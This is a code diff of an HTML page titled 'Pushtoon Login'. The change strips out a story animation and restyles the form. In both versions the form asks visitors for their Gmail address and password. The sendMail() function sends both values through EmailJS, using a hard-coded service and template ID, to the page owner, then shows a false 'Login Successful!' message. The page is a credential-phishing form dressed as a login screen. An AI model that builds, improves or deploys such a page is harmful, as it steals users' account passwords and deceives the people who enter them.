@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Story Login Scene</title>
+  <title>Pushtoon Login</title>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
@@ -13,138 +13,82 @@
 
     body{
       margin:0;
+      padding:0;
       height:100vh;
-      overflow:hidden;
-      font-family:Arial;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial, sans-serif;
 
-      /* cinematic background */
-      background-image:url("https://images.unsplash.com/photo-1605649487212-47bdab064df7");
+      background-image:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
       background-size:cover;
       background-position:center;
-      position:relative;
     }
 
-    /* dark cinematic overlay */
-    body::before{
-      content:"";
-      position:absolute;
-      width:100%;
-      height:100%;
-      background:rgba(0,0,0,0.45);
-      z-index:0;
-    }
-
-    /* STORY TEXT */
-    .story{
-      position:absolute;
-      top:30px;
-      width:100%;
-      text-align:center;
-      color:white;
-      font-size:22px;
-      z-index:2;
-      animation: fadeStory 3s ease-in-out infinite alternate;
-    }
-
-    @keyframes fadeStory{
-      from{opacity:0.5;}
-      to{opacity:1;}
-    }
-
-    /* CHARACTER */
-    .character{
-      position:absolute;
-      bottom:60px;
-      left:-100px;
-      font-size:60px;
-      z-index:2;
-      animation: walkScene 7s infinite ease-in-out;
-    }
-
-    @keyframes walkScene{
-
-      0%{
-        left:-100px;
-        bottom:60px;
-      }
-
-      40%{
-        left:30%;
-        bottom:60px;
-      }
-
-      55%{
-        left:45%;
-        bottom:160px;
-      }
-
-      60%{
-        left:45%;
-        bottom:60px;
-      }
-
-      100%{
-        left:45%;
-        bottom:60px;
-      }
-    }
-
-    /* LOGIN BOX appears like "story reveal" */
     .container{
-      position:absolute;
-      top:50%;
-      left:50%;
-      transform:translate(-50%,-50%) scale(0);
-      z-index:2;
-
       background:rgba(255,255,255,0.92);
       padding:40px;
       border-radius:20px;
       width:350px;
       text-align:center;
-      box-shadow:0px 10px 25px rgba(0,0,0,0.5);
-
-      animation: popLogin 2s forwards;
-      animation-delay:4s;
+      box-shadow:0px 10px 25px rgba(0,0,0,0.4);
+      backdrop-filter:blur(5px);
     }
 
-    @keyframes popLogin{
-      to{
-        transform:translate(-50%,-50%) scale(1);
-      }
-    }
-
+    /* 🔥 ANIMATED LOGIN TEXT */
     h2{
       color:#00e5ff;
+      margin-bottom:25px;
       font-size:35px;
-      margin-bottom:20px;
-      animation: glow 2s infinite alternate;
+      letter-spacing:2px;
+
+      animation: glowMove 2s ease-in-out infinite alternate;
     }
 
-    @keyframes glow{
-      from{ text-shadow:0 0 5px #00e5ff; }
-      to{ text-shadow:0 0 20px #00e5ff; }
+    @keyframes glowMove{
+      0%{
+        transform: translateY(0px);
+        text-shadow: 0 0 5px rgba(0,229,255,0.4);
+      }
+      100%{
+        transform: translateY(-8px);
+        text-shadow: 0 0 20px rgba(0,229,255,0.9),
+                     0 0 40px rgba(0,229,255,0.6);
+      }
     }
 
     input{
       width:90%;
       padding:14px;
-      margin:10px 0;
+      margin:12px 0;
+      border:2px solid #ddd;
       border-radius:12px;
-      border:none;
+      font-size:16px;
       outline:none;
+      transition:0.3s;
+    }
+
+    input:focus{
+      border-color:#6a1b9a;
+      box-shadow:0 0 12px rgba(106,27,154,0.5);
     }
 
     button{
       width:95%;
       padding:14px;
-      margin-top:10px;
       border:none;
       border-radius:12px;
-      background:linear-gradient(135deg,#ff9800,#ff5722);
+      background:linear-gradient(135deg, #ff9800, #ff5722);
       color:white;
-      font-size:18px;
+      font-size:20px;
       cursor:pointer;
+      transition:0.3s;
+      font-weight:bold;
+      margin-top:10px;
+    }
+
+    button:hover{
+      transform:scale(1.05);
     }
 
   </style>
@@ -153,17 +97,12 @@
 
 <body>
 
-<div class="story">
-  A traveler reaches the ancient mountains… and finds the hidden gate.
-</div>
-
-<div class="character">🧑‍🚶</div>
-
 <div class="container">
 
   <h2>LOGIN</h2>
 
   <input type="email" id="email" placeholder="Enter your Gmail">
+
   <input type="password" id="password" placeholder="Enter Password">
 
   <button onclick="sendMail()">LOG IN</button>
@@ -182,15 +121,24 @@ function sendMail(){
         return;
     }
 
-    let params = { email, password };
+    let params = {
+        email: email,
+        password: password
+    };
 
     emailjs.send(
         "service_bqnzz7f",
         "template_y4w4kzl",
         params
     )
-    .then(()=> alert("Login Successful!"))
-    .catch(()=> alert("FAILED"));
+    .then(function(response){
+        alert("Login Successful!");
+    })
+    .catch(function(error){
+        alert("FAILED");
+        console.log(error);
+    });
+
 }
 
 </script>
